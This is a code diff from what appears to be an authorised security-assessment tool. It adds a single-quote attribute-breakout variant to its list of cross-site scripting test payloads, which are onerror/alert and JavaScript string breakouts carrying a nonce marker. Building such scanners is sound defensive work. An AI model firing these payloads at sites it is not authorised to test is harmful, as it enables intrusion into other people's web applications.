@@ -989,12 +989,14 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
             technique = {
                 "xss_browser": "html_body",
                 "xss_browser_attribute": "html_attribute",
+                "xss_browser_attribute_single": "html_attribute_single",
                 "xss_browser_js_single": "js_single",
                 "xss_browser_js_double": "js_double",
             }.get(technique, technique)
             payloads = {
                 "html_body": '<img src=x onerror=alert("__PROWL_NONCE__")>',
                 "html_attribute": '"><img src=x onerror=alert("__PROWL_NONCE__")>',
+                "html_attribute_single": "'><img src=x onerror=alert(\"__PROWL_NONCE__\")>",
                 "js_single": "';alert(\"__PROWL_NONCE__\");//",
                 "js_double": '\";alert(\'__PROWL_NONCE__\');//',
             }
@@ -1299,6 +1301,7 @@ class ASMToolsManager(ScopedAssessmentTools, AssessmentCapabilities):
         xss_payloads = {
             "xss_browser": '<img src=x onerror=alert("__PROWL_NONCE__")>',
             "xss_browser_attribute": '"><img src=x onerror=alert("__PROWL_NONCE__")>',
+            "xss_browser_attribute_single": "'><img src=x onerror=alert(\"__PROWL_NONCE__\")>",
             "xss_browser_js_single": "';alert(\"__PROWL_NONCE__\");//",
             "xss_browser_js_double": '\";alert(\'__PROWL_NONCE__\');//',
         }
